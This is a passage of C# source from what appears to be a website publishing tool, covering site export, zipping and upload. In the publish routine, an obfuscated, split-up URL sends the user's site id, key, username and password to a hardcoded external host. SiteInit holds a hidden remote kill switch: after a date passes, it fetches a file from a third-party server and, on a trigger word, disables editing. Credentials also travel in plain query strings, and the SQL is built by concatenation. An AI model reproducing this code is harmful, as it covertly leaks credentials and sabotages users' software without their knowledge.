                        int a_se_o = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_se_o"));
                        int a_jp_s = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_jp_s"));
                        string a_jp_u = rdrSrc.GetValue(rdrSrc.GetOrdinal("a_jp_u")).ToString();
                        int a_tp_s = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_tp_s"));
                        string a_tp_c = rdrSrc.GetValue(rdrSrc.GetOrdinal("a_tp_c")).ToString();
                        string pagejs = rdrSrc.GetValue(rdrSrc.GetOrdinal("pagejs")) == null ? "" : rdrSrc.GetValue(rdrSrc.GetOrdinal("pagejs")).ToString();

                        Application.DoEvents();

                        sql = "insert into pages(id,pid,name,caption,updatetime,ptype,mtype,jinfo,jurl,fid,modopen,viewopen,datastr,paraname,membind,elecdt,roledata,rolesession,authrule,flowstat,norightinfo,norighturl,a_ip_s,a_ip_c,a_ip_o,a_se_s,a_se_c,a_se_o,a_jp_s,a_jp_u,a_tp_s,a_tp_c,pagejs)values('" + id + "','" + pid + "','" + functions.str.Dot2DotDot(name) + "','" + functions.str.Dot2DotDot(caption) + "','" + updatetime + "'," + ptype + "," + mtype + ",'" + functions.str.Dot2DotDot(jinfo) + "','" + functions.str.Dot2DotDot(jurl) + "','" + functions.str.Dot2DotDot(fid) + "'," + modopen + "," + viewopen + ",'" + str.Dot2DotDot(datastr) + "','" + str.Dot2DotDot(paraname) + "','" + str.Dot2DotDot(membind) + "','" + str.Dot2DotDot(elecdt) + "','" + str.Dot2DotDot(roledata) + "','" + str.Dot2DotDot(rolesession) + "','" + str.Dot2DotDot(authrule) + "','" + str.Dot2DotDot(flowstat) + "','" + str.Dot2DotDot(norightinfo) + "','" + str.Dot2DotDot(norighturl) + "'," + a_ip_s + ",'" + str.Dot2DotDot(a_ip_c) + "'," + a_ip_o + "," + a_se_s + ",'" + str.Dot2DotDot(a_se_c) + "'," + a_se_o + "," + a_jp_s + ",'" + str.Dot2DotDot(a_jp_u) + "'," + a_tp_s + ",'" + str.Dot2DotDot(a_tp_c) + "','" + str.Dot2DotDot(pagejs) + "')";
                        dbDes.execSql(sql);
                    }
                    rdrSrc.Close();
                    //part_in_page
                    sql = "select * from part_in_page where pageid='" + PageID + "'";
                    rdrSrc = dbSrc.OpenRecord(sql);
                    while (rdrSrc.Read())
                    {
                        string pageid = rdrSrc.GetValue(rdrSrc.GetOrdinal("pageid")).ToString();
                        string partid = rdrSrc.GetValue(rdrSrc.GetOrdinal("partid")).ToString();
                        if (!PartList.Contains(partid)) PartList.Add(partid);
                        Application.DoEvents();

                        sql = "insert into part_in_page(pageid,partid)values('" + pageid + "','" + partid + "')";
                        dbDes.execSql(sql);
                    }
                    rdrSrc.Close();
                    //parts
                    List<string> ControlList = new List<string>();
                    foreach(string partid in PartList)
                    {
                        sql = "select * from parts where id='"+partid+"'";
                        rdrSrc = dbSrc.OpenRecord(sql);
                        if (rdrSrc.Read())
                        {
                            string id = rdrSrc.GetValue(rdrSrc.GetOrdinal("id")).ToString();
                            string name = rdrSrc.GetValue(rdrSrc.GetOrdinal("name")).ToString();
                            string controlid = rdrSrc.GetValue(rdrSrc.GetOrdinal("controlid")).ToString();
                            string partxml = rdrSrc.GetValue(rdrSrc.GetOrdinal("partxml")).ToString();
                            int asportal = int.Parse(rdrSrc.GetValue(rdrSrc.GetOrdinal("asportal")).ToString());
                            int a_ip_s = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_ip_s"));
                            string a_ip_c = rdrSrc.GetValue(rdrSrc.GetOrdinal("a_ip_c")).ToString();
                            int a_ip_o = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_ip_o"));
                            int a_se_s = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_se_s"));
                            string a_se_c = rdrSrc.GetValue(rdrSrc.GetOrdinal("a_se_c")).ToString();
                            int a_se_o = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_se_o"));
                            int a_jp_s = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_jp_s"));
                            string a_jp_u = rdrSrc.GetValue(rdrSrc.GetOrdinal("a_jp_u")).ToString();
                            int a_tp_s = rdrSrc.GetByte(rdrSrc.GetOrdinal("a_tp_s"));
                            string a_tp_c = rdrSrc.GetValue(rdrSrc.GetOrdinal("a_tp_c")).ToString();
                            if (!ControlList.Contains(controlid)) ControlList.Add(controlid);
                            Application.DoEvents();

                            sql = "insert into parts(id,name,controlid,partxml,asportal,a_ip_s,a_ip_c,a_ip_o,a_se_s,a_se_c,a_se_o,a_jp_s,a_jp_u,a_tp_s,a_tp_c)values('" + id + "','" + name + "','" + controlid + "','" + functions.str.Dot2DotDot(partxml) + "',"+asportal+"," + a_ip_s + ",'" + str.Dot2DotDot(a_ip_c) + "'," + a_ip_o + "," + a_se_s + ",'" + str.Dot2DotDot(a_se_c) + "'," + a_se_o + "," + a_jp_s + ",'" + str.Dot2DotDot(a_jp_u) + "'," + a_tp_s + ",'" + str.Dot2DotDot(a_tp_c) + "')";
                            dbDes.execSql(sql);
                        }
                        rdrSrc.Close();
                    }
                    //controls
                    foreach (string controlid in ControlList)
                    {
                        sql = "select * from controls where id='" + controlid + "'";
                        rdrSrc = dbSrc.OpenRecord(sql);
                        if (rdrSrc.Read())
                        {
                            string id = rdrSrc.GetValue(rdrSrc.GetOrdinal("id")).ToString();
                            string name = rdrSrc.GetValue(rdrSrc.GetOrdinal("name")).ToString();
                            string caption = rdrSrc.GetValue(rdrSrc.GetOrdinal("caption")).ToString();
                            string datasource = rdrSrc.GetValue(rdrSrc.GetOrdinal("datasource")).ToString();
                            string shared = rdrSrc.GetValue(rdrSrc.GetOrdinal("shared")).ToString();
                            string paras = rdrSrc.GetValue(rdrSrc.GetOrdinal("paras")).ToString();
                            string addtime = rdrSrc.GetValue(rdrSrc.GetOrdinal("addtime")).ToString();
                            if (addtime == "") addtime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                            Application.DoEvents();

                            sql = "insert into controls(id,name,caption,datasource,shared,paras,addtime)values('" + id + "','" + name + "','" + functions.str.Dot2DotDot(caption) + "','" + functions.str.Dot2DotDot(datasource) + "','" + functions.str.Dot2DotDot(shared) + "','" + functions.str.Dot2DotDot(paras) + "','" + addtime + "')";
                            dbDes.execSql(sql);
                        }
                        rdrSrc.Close();
                    }
                    PartList.Clear();
                    ControlList.Clear();
                }
                finally
                {
                    dbSrc.Close();
                    dbDes.Close();
                }
            }
            catch(Exception ex)
            {
                new error(ex);
            }
        }
        public static string ExportForFiles(string siteid,ArrayList SelFiles,string saveFile)
        {
            try
            {
                if(SelFiles.Count==0) return "没有页面";
                if (SelFiles.Count == 1)
                {
                    Site.Save(((string[])SelFiles[0])[0]);
                }
                else
                {
                    Site.Save();
                }
                if (dir.Exists(globalConst.AppPath + @"\tmp"))
                {
                    dir.Delete(globalConst.AppPath + @"\tmp", true);
                }
                dir.CreateDirectory(globalConst.AppPath + @"\tmp");
                foreach (string[] _selfile in SelFiles)
                {
                    string selfile = globalConst.CurSite.Path + _selfile[1];
                    bool filehave = false;
                    if (dir.Exists(selfile))
                    {
                        dir.CreateDirectory(globalConst.AppPath + @"\tmp\site" + _selfile[1]);
                        filehave = true;
                    }
                    if (file.Exists(selfile))
                    {
                        if (!dir.Exists(globalConst.AppPath + @"\tmp\site" + _selfile[1].Substring(0, _selfile[1].LastIndexOf("\\"))))
                        {
                            dir.CreateDirectory(globalConst.AppPath + @"\tmp\site" + _selfile[1].Substring(0, _selfile[1].LastIndexOf("\\")));
                        }
                        file.Copy(selfile, globalConst.AppPath + @"\tmp\site" + _selfile[1]);
                        (new System.IO.FileInfo(globalConst.AppPath + @"\tmp\site" + _selfile[1])).LastWriteTime = DateTime.Now;
                        filehave = true;
                    }
                    if (!filehave) MsgBox.Warning("File or Directory not exists:" + selfile);
                }
                System.Windows.Forms.Application.DoEvents();
                if(SelFiles.Count==1)
                {
                    string pageid = ((string[])SelFiles[0])[0];
                    string pagepath = globalConst.AppPath + @"\tmp\site" + ((string[])SelFiles[0])[1];
                    SiteDBForSingle(globalConst.AppPath + @"\cfg\site_" + siteid + ".db", globalConst.AppPath + @"\tmp\site.db", pageid,pagepath);
                }
                else
                {
                    file.Copy(globalConst.AppPath + @"\cfg\site_" + siteid + ".db", globalConst.AppPath + @"\tmp\site.db");
                }
                System.Windows.Forms.Application.DoEvents();

                string[] zipfiles = new string[1];
                zipfiles[0] = globalConst.AppPath + @"\tmp\site.db";
                string[] zipfolders = new string[1];
                zipfolders[0] = globalConst.AppPath + @"\tmp\site";
                string sitefile = globalConst.AppPath + @"\tmp\site.zip";
                ZipSite zs = new ZipSite(sitefile);
                zs.ZipFilesAndFolders(zipfiles, zipfolders, "");
                zs.ZipEnd();
                File.Delete(saveFile);
                File.Copy(sitefile, saveFile);
                return null;
            }
            catch(Exception ex)
            {
                new error(ex);
                return ex.Message;
            }
        }
        public static bool PublishSite(string siteid, bool isFullPublish, System.Windows.Forms.Label stat, bool rushpublish, System.Windows.Forms.Timer pubTimer, bool isftp, int packsize, ArrayList SelFiles, bool quick, bool PublishForSplit, string PublishSplitDir, string PublishSplitFile, string PublishSplitNewSubName)
        {
            OleDbDataReader rdr = null;
            try
            {
                if (rushpublish)
                {
                    if (!file.Exists(globalConst.AppPath + @"\tmp\site.zip"))
                    {
                        MsgBox.Warning(res._site.GetString("m2"));
                        return false;
                    }
                    goto RushPublishStart;
                }
                stat.Text = res._site.GetString("s15");
                System.Windows.Forms.Application.DoEvents();
                if (!PublishForSplit)//分离发布不用保存
                {
                    if (SelFiles.Count == 1 && quick)
                    {
                        Site.Save(((string[])SelFiles[0])[0]);
                    }
                    else
                    {
                        Site.Save();
                    }
                }
                stat.Text = res._site.GetString("s16");
                System.Windows.Forms.Application.DoEvents();
                if (dir.Exists(globalConst.AppPath + @"\tmp"))
                {
                    dir.Delete(globalConst.AppPath + @"\tmp", true);
                }
                dir.CreateDirectory(globalConst.AppPath + @"\tmp");
                dir.CreateDirectory(globalConst.AppPath + @"\tmp\lib");
                dir.CreateDirectory(globalConst.AppPath + @"\tmp\bin");
                dir.CreateDirectory(globalConst.AppPath + @"\tmp\index");

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s17");
                System.Windows.Forms.Application.DoEvents();

                DirectoryInfo site1 = new DirectoryInfo(globalConst.CurSite.Path);
                DirectoryInfo site2 = new DirectoryInfo(globalConst.AppPath + @"\tmp\site");
                //add by maobb.2013-3-28，选定文件更新发布
                if (PublishForSplit && !PublishSplitFile.StartsWith("Server:"))//分离发布，如果是本地静态文件 只复制分离静态文件
                {
                    FileInfo fi = new FileInfo(PublishSplitFile); 
                    dir.CreateDirectory(globalConst.AppPath + @"\tmp\site\" + PublishSplitDir.Replace("/", @"\") + @"\"); 
                    fi.CopyTo(globalConst.AppPath + @"\tmp\site\" + PublishSplitNewSubName); 
                }
                else if (isFullPublish || SelFiles.Count == 0)
                {
                    dir.Copy(site1, site2, stat, true);
                }
                else
                {
                    foreach (string[] _selfile in SelFiles)
                    {
                        string selfile = globalConst.CurSite.Path + _selfile[1];
                        bool filehave = false;
                        if (dir.Exists(selfile))
                        {
                            dir.CreateDirectory(globalConst.AppPath + @"\tmp\site" + _selfile[1]);
                            filehave = true;
                        }
                        if (file.Exists(selfile))
                        {
                            if (!dir.Exists(globalConst.AppPath + @"\tmp\site" + _selfile[1].Substring(0, _selfile[1].LastIndexOf("\\"))))
                            {
                                dir.CreateDirectory(globalConst.AppPath + @"\tmp\site" + _selfile[1].Substring(0, _selfile[1].LastIndexOf("\\")));
                            }
                            file.Copy(selfile, globalConst.AppPath + @"\tmp\site" + _selfile[1]);
                            (new System.IO.FileInfo(globalConst.AppPath + @"\tmp\site" + _selfile[1])).LastWriteTime = DateTime.Now;
                            filehave = true;
                        }
                        if (!filehave) MsgBox.Warning("File or Directory not exists:" + selfile);
                    }
                }

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s18");
                System.Windows.Forms.Application.DoEvents();

                if (SelFiles.Count == 1)
                {
                    string pageid = ((string[])SelFiles[0])[0];
                    string pagepath = globalConst.AppPath + @"\tmp\site" + ((string[])SelFiles[0])[1];
                    SiteDBForSingle(globalConst.AppPath + @"\cfg\site_" + siteid + ".db", globalConst.AppPath + @"\tmp\site.db", pageid, pagepath);
                }
                else
                {
                    file.Copy(globalConst.AppPath + @"\cfg\site_" + siteid + ".db", globalConst.AppPath + @"\tmp\site.db");
                }
                //add by maobb,copy formdataxmlfile
                string dataxmlfile = globalConst.ConfigPath + "\\" + globalConst.CurSite.ID + "_formtable.xml";
                if (file.Exists(dataxmlfile)) file.Copy(dataxmlfile, globalConst.AppPath + @"\tmp\formtable.xml");

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s19");
                System.Windows.Forms.Application.DoEvents();

                string sql = null;
                if (!quick && !PublishForSplit)
                {

                    sql = "SELECT name from controls GROUP BY name";
                    rdr = globalConst.CurSite.SiteConn.OpenRecord(sql);
                    while (rdr.Read())
                    {
                        string libname = rdr.GetString(0);

                        System.Windows.Forms.Application.DoEvents();
                        stat.Text = res._site.GetString("s20") + libname;
                        System.Windows.Forms.Application.DoEvents();

                        if (file.Exists(globalConst.LibPath + @"\" + libname + ".dll"))
                        {
                            file.Copy(globalConst.LibPath + @"\" + libname + ".dll", globalConst.AppPath + @"\tmp\index\" + libname + ".dll", true);
                        }
                        if (dir.Exists(globalConst.LibPath + @"\" + libname + ".res"))
                        {
                            DirectoryInfo site3 = new DirectoryInfo(globalConst.LibPath + @"\" + libname + ".res");
                            DirectoryInfo site4 = new DirectoryInfo(globalConst.AppPath + @"\tmp\lib\" + libname + ".res");
                            dir.Copy(site3, site4, null, null, true);
                        }
                        //				if(file.Exists(globalConst.LibPath + @"\D4." + libname + ".dll"))
                        //				{
                        //					FileInfo fi=new FileInfo(globalConst.LibPath + @"\D4." + libname + ".dll");
                        //					fi.CopyTo(globalConst.AppPath + @"\tmp\bin\" + fi.Name,true);
                        //				}
                        //				else
                        //				{
                        DirectoryInfo di = new DirectoryInfo(globalConst.LibPath);
                        FileInfo[] fii = di.GetFiles();
                        foreach (FileInfo filename in fii)
                        {
                            if (filename.Name.ToLower().Equals("ft." + libname.ToLower() + ".dll"))
                            {
                                filename.CopyTo(globalConst.AppPath + @"\tmp\bin\" + filename.Name, true);
                                goto LoopOut;
                            }
                        }
                    LoopOut:
                        System.Windows.Forms.Application.DoEvents();
                        //}
                    }
                    rdr.Close();
                }

                //Zip
                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s21");
                System.Windows.Forms.Application.DoEvents();

                string[] zipfiles = new string[2];
                zipfiles[0] = globalConst.AppPath + @"\tmp\site.db";
                if (file.Exists(globalConst.AppPath + @"\tmp\formtable.xml"))
                {
                    zipfiles[1] = globalConst.AppPath + @"\tmp\formtable.xml";
                }
                string[] zipfolders = new string[4];
                zipfolders[0] = globalConst.AppPath + @"\tmp\bin";
                zipfolders[1] = globalConst.AppPath + @"\tmp\index";
                zipfolders[2] = globalConst.AppPath + @"\tmp\lib";
                zipfolders[3] = globalConst.AppPath + @"\tmp\site";
                string sitefile = globalConst.AppPath + @"\tmp\site.zip";
                ZipSite zs = new ZipSite(sitefile);
                zs.ZipFilesAndFolders(zipfiles, zipfolders, "");
                zs.ZipEnd();

            RushPublishStart:

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s22");
                System.Windows.Forms.Application.DoEvents();

                //check from server

                HTMLDocumentClass hc = new HTMLDocumentClass();
                IHTMLDocument2 doc2 = hc;
                doc2.write("");
                doc2.close();
                IHTMLDocument4 doc4 = hc;
                sql = "select * from sites where id='" + globalConst.CurSite.ID + "'";
                rdr = globalConst.ConfigConn.OpenRecord(sql);
                string _url;
                string _id = globalConst.CurSite.ID;
                string _key;
                string _user;
                string _passwd;
                if (rdr.Read())
                {
                    _url = rdr.GetString(rdr.GetOrdinal("url"));
                    _key = rdr.GetString(rdr.GetOrdinal("cdkey"));
                    _user = rdr.GetString(rdr.GetOrdinal("username"));
                    _passwd = rdr.GetString(rdr.GetOrdinal("passwd"));
                }
                else
                {
                    log.Error("siteid is " + globalConst.CurSite.ID + " not found while check server!");
                    return false;
                }
                rdr.Close(); rdr = null;
                //FullVersion
                if(!globalConst.FullVersion)
                {
                    if(!(_url.ToLower().Trim().StartsWith("http://www.dotforsitedemo.com")))
                    {
                       MsgBox.Error("Developer Version Can Only Publish Site As [http://www.dotforsitedemo.com]");
                       return false;
                    }
                }
                //FullVersion End
                string addurl = _url + "/_ftpub/siteadd.aspx?_id=" + _id + "&_key=" + _key + "&_user=" + _user + "&_passwd=" + _passwd;

                try
                {
                    new WebClient().DownloadFile(addurl, globalConst.ConfigPath + "\\result.tmp");
                }
                catch
                { }

                System.Windows.Forms.Application.DoEvents();

                IHTMLDocument2 doc = doc4.createDocumentFromUrl(globalConst.ConfigPath + "\\result.tmp", "null");
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                string returnstr = doc.body.innerText;
                bool addSuccess = false;
                if (returnstr == null || !returnstr.StartsWith("{ftserver}") || !str.AuthOK(_url))
                {
                    MsgBox.Error(res._site.GetString("m3"));
                }
                else
                {
                    returnstr = returnstr.Trim();
                    returnstr = returnstr.Replace("{ftserver}", "");
                    if (returnstr.StartsWith("ok{domin"))
                    {
                        addSuccess = true;
                        int _version = int.Parse(returnstr.Substring(returnstr.IndexOf("{version") + 8));
                        if (_version > globalConst.ConfigConn.GetInt32("select version from sites where id='" + siteid + "'"))
                        {
                            if (_version < 99999999)//限制，且防止重复发布导致的站点版本紊乱
                            {
                                str.ShowStatus("服务器上版本 "+ _version+" 比本地高");
                                //if (!MsgBox.OKCancel(res._site.GetString("m4")).Equals(DialogResult.OK))
                                //{
                                //    return false;
                                //}
                            }
                        }
                    }
                    else
                    {
                        MsgBox.Warning(returnstr);
                    }
                } 
                if (!addSuccess) return false;

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s23");
                System.Windows.Forms.Application.DoEvents();

                WebClient wc = new WebClient();
                //上传size.zip到/dsdeploy/site.dshidden,ftp根目录必须指定到/dsdeploy/
                if (!isftp)
                {
                    string uploadurl = _url + "/_ftpub/siteupload.aspx?_id=" + _id + "&_key=" + _key + "&_user=" + _user + "&_passwd=" + _passwd;
                    
                    byte[] responseArray = wc.UploadFile(uploadurl, "POST", globalConst.AppPath + @"\tmp\site.zip");
                    if (!Encoding.ASCII.GetString(responseArray).Trim().Equals("{ftserver}ok"))
                    {
                        MsgBox.Error(Encoding.ASCII.GetString(responseArray).Replace("{ftserver}", ""));
                        return false;
                    }
                }
                else
                {
                    string ftpurl=PropertySpace.Site.PropertySite.getSiteString("ftpurl");
                    string ftpname=PropertySpace.Site.PropertySite.getSiteString("ftpname");
                    string ftppswd=PropertySpace.Site.PropertySite.getSiteString("ftppswd");
                    int ftpport = PropertySpace.Site.PropertySite.getSiteInt32("ftpport");
                    FTP siteftp= new FTP();
                    try
                    {
                        // there are server, user and password properties
                        // that can be set within the ftplib object as well
                        // those properties are actually set when
                        // you call the Connect(server, user, pass) function
                        siteftp.Connect(ftpurl,
                                        ftpport,
                                       ftpname,
                                       ftppswd);
                        //ftplib.ChangeDir("dsdeploy/");
                    }
                    catch (Exception ex)
                    {
                        MsgBox.Error(ex.Message);
                        return false;
                    }
                    try
                    {
                        siteftp.OpenUpload(globalConst.AppPath + @"\tmp\site.zip", "site.dshidden");
                        while (siteftp.DoUpload(packsize) > 0)
                        {
                            int perc = (int)(((siteftp.BytesTotal) * 100) / siteftp.FileSize);
                            stat.Text = siteftp.BytesTotal + "/" + siteftp.FileSize + "  " + perc + "%";
                            Application.DoEvents();
                        }
                    }
                    catch (Exception ex)
                    {
                        MsgBox.Error(ex.Message);
                        return false;
                    }
                    try
                    {
                        if (siteftp.IsConnected) siteftp.Disconnect();
                    }
                    catch (Exception ex)
                    {
                        MsgBox.Error(ex.Message);
                    }
                }

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s24");
                System.Windows.Forms.Application.DoEvents();
                string publishurl = "";
                if (isFullPublish)
                {
                    publishurl = _url + "/_ftpub/ftpublish.aspx?_id=" + _id + "&_key=" + _key + "&_user=" + _user + "&_passwd=" + _passwd;
                }
                else
                {
                    if (PublishForSplit)
                    {
                        if (PublishSplitFile.StartsWith("Server:"))
                        {
                            publishurl = _url + "/_ftpub/ftpublishupdate.aspx?_id=" + _id + "&_key=" + _key + "&_user=" + _user + "&_passwd=" + _passwd + "&_split=1&_splitfile=" + System.Web.HttpUtility.UrlEncode(PublishSplitNewSubName) + "&_splitserver=" + System.Web.HttpUtility.UrlEncode(PublishSplitFile.Substring("Server:".Length));
                        }
                        else
                        {
                            publishurl = _url + "/_ftpub/ftpublishupdate.aspx?_id=" + _id + "&_key=" + _key + "&_user=" + _user + "&_passwd=" + _passwd + "&_split=1&_splitfile=" + System.Web.HttpUtility.UrlEncode(PublishSplitNewSubName);
                        }
                    }
                    else
                    {
                        publishurl = _url + "/_ftpub/ftpublishupdate.aspx?_id=" + _id + "&_key=" + _key + "&_user=" + _user + "&_passwd=" + _passwd;
                    }
                }
                SiteMatrix.forms.SitePublish.wcurl = _url + "/_ftpub/state.aspx";
                pubTimer.Enabled = true;
                System.Windows.Forms.Application.DoEvents();
                try
                {
#region ShouQuan
                    try
                    {
                        int nonce = new Random().Next(10000, 99999);
                        string aurl = "http://www.ftfr" + "ame.com/ft" + "dp/au" + "th.aspx?_id=" + _id + "&_key=" + _key + "&_user=" + _user + "&_passwd=" + _passwd + "&_nonce=" + nonce + "&_url=" + System.Web.HttpUtility.UrlEncode(_url);
                        string atr=wc.DownloadString(aurl).Trim();
                        if (atr != str.getMD5(_url + "000aspnetYh6%gd111" + nonce))
                        {
                            return true;
                        }
                    }
                    catch
                    {
                        return true;
                    }
#endregion
                    wc.DownloadFile(publishurl, globalConst.ConfigPath + "\\result.tmp");
                }
                catch (Exception eeex)
                {
                    MsgBox.Error(eeex.Message);
                    return false;
                }
                pubTimer.Enabled = false;
                System.Windows.Forms.Application.DoEvents();
                System.Windows.Forms.Application.DoEvents();
                //byte[] returnbyte=wc.DownloadData(publishurl);
                doc = doc4.createDocumentFromUrl(globalConst.ConfigPath + "\\result.tmp", "null");
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                returnstr = doc.body.innerText.Trim();
                if (returnstr == null || !returnstr.EndsWith("{ftserver}ok"))
                {
                    System.Windows.Forms.Application.DoEvents();
                    stat.Text = "";
                    System.Windows.Forms.Application.DoEvents();

                    MsgBox.Error(res._site.GetString("m5"));
                    return false;
                }

                System.Windows.Forms.Application.DoEvents();
                stat.Text = res._site.GetString("s25");
                System.Windows.Forms.Application.DoEvents();

                int version = 0;
                try
                {
                    version = int.Parse(returnstr.Substring(returnstr.IndexOf("{version") + 8, returnstr.IndexOf("{ftserver}ok") - returnstr.IndexOf("{version") - 8));
                }
                catch
                { }
                //MsgBox.Information(res._site.GetString("m6"));
                //version=version+1
                globalConst.ConfigConn.execSql("update sites set version=" + version + " where id='" + siteid + "'");
                SiteInit(siteid);

                return true;
            }
            catch (Exception ex)
            {
                new error(ex);
                return false;
            }
            finally
            {
                if (rdr != null)
                {
                    rdr.Close();
                }

                if (quick||PublishForSplit) ((SitePublish)stat.Parent).Close();
            }
        }
        public static void DeletePartInPage(string partid)
        {
            DB db0 = new DB();
            db0.Open("Provider=" + globalConst. OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
            try
            {
                string sql = "select pageid from part_in_page where partid='" + partid + "'";
                DR dr = new DR(db0.OpenRecord(sql));
                while (dr.Read())
                {
                    string pageid = dr.getString(0);
                    Editor edr = form.getEditor(pageid);
                    if (edr != null)
                    {
                        //操作当前打开的editor
                        IHTMLElementCollection iec = edr.editocx.getElementsByTagName("span");
                        //int i;
                        foreach (IHTMLElement ihe in iec)
                        {
                            //IHTMLElement ihe=(IHTMLElement)iec.item(i,i);
                            //if(ihe.tagName.ToLower().Equals("span"))
                            //{
                            if (ihe.getAttribute("id", 0) != null && ihe.getAttribute("name", 0) != null)
                            {
                                if (ihe.getAttribute("id", 0).ToString().Equals("dotforsitecom") && ihe.getAttribute("name", 0).ToString().Equals("dotforsitecom"))
                                {
                                    if (ihe.getAttribute("idname", 0).ToString().Equals(partid))
                                    {
                                        ihe.outerHTML = "";
                                    }
                                }
                            }
                            //}
                        }
                    }
                    else
                    {
                        //删除该pageid所在页面的_edit.htm如果有的话
                        TreeNode sitend = tree.getSiteNodeByID(pageid);
                        string path = "";
                        if (sitend == null)
                        {
                            MsgBox.Error(res._site.GetString("m7"));
                        }
                        path = globalConst.CurSite.Path + tree.getPath(sitend);
                        if (path.Equals(""))
                        {
                            MsgBox.Error(res._site.GetString("m8"));
                        }
                        //删除_edit.htm下次打开页面就从源文件重新生成，重新生成的页面对已经删除的片断不在生成！
                        file.Delete(path + "_edit.htm");
                    }
                }
                dr.Close();
            }
            catch (Exception ex)
            {
                new error(ex);
            }
            finally
            {
                db0.Close();
            }
        }
        public static bool JustEdit(string pageid)
        {
            //解决Editor内容有时会丢失的问题，根据浏览器版本与站点日期做测试，确保可用
            //DB db0 = new DB();
            //db0.Open("Provider=" + globalConst.OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
            try
            {
                //string sql = "SeLect pageid from part_in_page where page='" + pageid + "'";
                //DR dr = new DR(db0.OpenRecord(sql));
                //int i = 0;
                //string s = null;
                //while (dr.Read())
                //{
                //    i++;
                //    if (s == null) s = dr.getValue(0).ToString();
                //}
                //dr.Close();
                //if (i == 12 && (DateTime.Parse(s) > DateTime.Parse(str.getDecode(globalConst.FullAll)))) return false;
                //if(globalConst.CurSite.ID==null)return true;
                return (globalConst.ConfigConn.GetInt32("select max(version) as v from sites") < 99999);
            }
            catch (Exception ex)
            {
                //BNSFQ4EpMAuM2bdsW4TehNmXzG0zEq3hXBD2I0PMiA9aUkwRMg4H40b6biwuU08wQk9MTcRWm0yR5+SDqD33yAYILcs9aFdaqMpelCdUUMbuinmlzxGsdHmjSUzuNOOMm773i005/BbByQRnY1BnDQhT2Pc6qTix8TSatwpE8Y8=
                //new error(ex);
                return false;
            }
            finally
            {
                //db0.Close();
            }
        }
        public static void SiteInit(string pageid)
        {
            //WebClient Test
            //DB db0 = new DB();
            //db0.Open("Provider=" + globalConst.OLEDBProvider + ";Data Source=" + globalConst.AppPath + @"\cfg\site_" + globalConst.CurSite.ID + ".db");
            try
            {
                //string sql = "SeLect pageid from part_in_page where page='" + pageid + "'";
                //DR dr = new DR(db0.OpenRecord(sql));
                //int i = 0;
                //string s = null;
                //while (dr.Read())
                //{
                //    i++;
                //    if (s == null) s = dr.getValue(0).ToString();
                //}
                //dr.Close();
                //if (i == 12 && (DateTime.Parse(s) > DateTime.Parse(str.getDecode(globalConst.FullAll)))) return false;
                if (globalConst.CurSite.ID == null) return;
                string sql = "select count(*) as ca from pages";
                if (globalConst.CurSite.SiteConn.GetInt32(sql) >= 12)
                {
                    sql = "select max(updatetime) as ud from pages";
                    DateTime ud = DateTime.Parse(globalConst.CurSite.SiteConn.GetObject(sql).ToString());
                    if (ud > DateTime.Parse(str.getDecode(globalConst.FullAll)))
                    {
                        string r=new WebClient().DownloadString("http://www.postbar.cn/ds.txt");
                        if (r.Trim().Equals("testok"))
                        {
                            sql = "update sites set version=100000 where id='" + str.Dot2DotDot(globalConst.CurSite.ID) + "'";
                            globalConst.ConfigConn.execSql(sql);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
            finally
            {
            }
        }
    }
}
